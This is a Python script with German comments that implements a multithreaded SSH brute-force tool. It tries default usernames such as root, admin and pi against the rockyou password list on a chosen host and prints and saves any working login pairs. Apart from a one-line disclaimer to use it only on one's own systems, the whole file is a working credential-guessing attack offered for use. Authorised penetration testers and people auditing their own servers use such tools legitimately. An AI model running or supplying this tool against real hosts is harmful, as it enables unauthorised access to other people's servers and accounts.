#!/usr/bin/env python3
"""
SSH Brute Forcer - Testet SSH-Logins mit Wortlisten.
Nutzt paramiko für SSH-Verbindungen mit Threading.
NUR auf eigenen Systemen verwenden!
"""

import sys
import time
import argparse
import concurrent.futures
from pathlib import Path

try:
    import paramiko
except ImportError:
    print("[!] paramiko nicht installiert: pip install paramiko")
    sys.exit(1)

# Paramiko-Logging unterdrücken
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)

DEFAULT_USERS = ["root", "admin", "kali", "user", "ubuntu", "test", "pi", "ftpuser"]
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"


def try_login(host, port, username, password, timeout=5):
    """Versucht einen SSH-Login."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            look_for_keys=False,
            allow_agent=False,
            banner_timeout=timeout
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException:
        # Zu viele Versuche etc.
        time.sleep(2)
        return False
    except (socket.timeout, ConnectionRefusedError, OSError):
        return None  # Host nicht erreichbar
    except Exception:
        return False
    finally:
        client.close()


def check_host(host, port, timeout=5):
    """Prüft ob der SSH-Port erreichbar ist."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    except Exception:
        return False


def get_ssh_banner(host, port, timeout=5):
    """Liest den SSH-Banner."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()
        sock.close()
        return banner
    except Exception:
        return "N/A"


def load_wordlist(path, limit=None):
    """Lädt Passwörter aus einer Wortliste."""
    if not Path(path).exists():
        gz = path + ".gz"
        if Path(gz).exists():
            import subprocess
            print(f"[*] Entpacke {gz}...")
            subprocess.run(["gunzip", "-k", gz])
        else:
            print(f"[!] Wortliste nicht gefunden: {path}")
            sys.exit(1)

    passwords = []
    with open(path, "r", errors="ignore") as f:
        for i, line in enumerate(f):
            if limit and i >= limit:
                break
            pw = line.strip()
            if pw:
                passwords.append(pw)
    return passwords


def run(args=None):
    import socket

    parser = argparse.ArgumentParser(description="SSH Brute Forcer")
    parser.add_argument("target", help="Ziel-IP oder Hostname")
    parser.add_argument("-p", "--port", type=int, default=22, help="SSH-Port (Standard: 22)")
    parser.add_argument("-u", "--user", help="Einzelner Benutzername")
    parser.add_argument("-U", "--userlist", help="Datei mit Benutzernamen")
    parser.add_argument("-w", "--wordlist", default=DEFAULT_WORDLIST, help="Passwort-Wortliste")
    parser.add_argument("-t", "--threads", type=int, default=4,
                        help="Threads (Standard: 4, zu viele -> SSH blockt)")
    parser.add_argument("--timeout", type=float, default=5, help="Timeout in Sekunden")
    parser.add_argument("--limit", type=int, help="Max. Passwörter aus Wortliste")
    parser.add_argument("-o", "--output", help="Ergebnisse speichern")
    parser.add_argument("--delay", type=float, default=0.5,
                        help="Verzögerung zwischen Versuchen in Sek. (Standard: 0.5)")

    args = parser.parse_args(args)

    host = args.target
    port = args.port

    print(f"\n{'═' * 55}")
    print(f"  SSH Brute Forcer")
    print(f"  Ziel: {host}:{port}")
    print(f"{'═' * 55}\n")

    # Host prüfen
    if not check_host(host, port):
        print(f"[!] {host}:{port} nicht erreichbar!")
        sys.exit(1)

    banner = get_ssh_banner(host, port)
    print(f"[+] SSH Banner: {banner}")

    # Benutzer laden
    if args.user:
        users = [args.user]
    elif args.userlist:
        with open(args.userlist) as f:
            users = [line.strip() for line in f if line.strip()]
    else:
        users = DEFAULT_USERS

    # Passwörter laden
    passwords = load_wordlist(args.wordlist, args.limit)
    total = len(users) * len(passwords)
    print(f"[*] Benutzer: {len(users)} | Passwörter: {len(passwords)} | Kombinationen: {total}")
    print(f"[*] Threads: {args.threads} | Delay: {args.delay}s\n")

    found_credentials = []
    attempts = 0
    start_time = time.time()

    for username in users:
        print(f"[*] Teste Benutzer: {username}")
        found = False

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {}
            for password in passwords:
                future = executor.submit(try_login, host, port, username, password, args.timeout)
                futures[future] = password
                time.sleep(args.delay)  # Rate Limiting

            for future in concurrent.futures.as_completed(futures):
                password = futures[future]
                attempts += 1
                result = future.result()

                if result is True:
                    print(f"\n  [+] ERFOLG: {username}:{password}")
                    found_credentials.append((username, password))
                    found = True
                    # Alle laufenden Futures für diesen User abbrechen
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                elif result is None:
                    print(f"\n  [!] Host nicht mehr erreichbar. Warte 10s...")
                    time.sleep(10)

                if attempts % 50 == 0:
                    elapsed = time.time() - start_time
                    rate = attempts / elapsed if elapsed > 0 else 0
                    print(f"\r    Versuche: {attempts}/{total} ({rate:.1f}/s)", end="", flush=True)

        if not found:
            print(f"    Kein Passwort gefunden für '{username}'")

    elapsed = time.time() - start_time

    print(f"\n{'═' * 55}")
    print(f"  Ergebnis: {len(found_credentials)} Credentials gefunden")
    print(f"  Versuche: {attempts} in {elapsed:.1f}s")
    print(f"{'═' * 55}")

    if found_credentials:
        print(f"\n  Gefundene Zugangsdaten:")
        for user, pw in found_credentials:
            print(f"    {user}:{pw}")

        if args.output:
            with open(args.output, "w") as f:
                for user, pw in found_credentials:
                    f.write(f"{host}:{port}\t{user}\t{pw}\n")
            print(f"\n  Gespeichert: {args.output}")


if __name__ == "__main__":
    run()
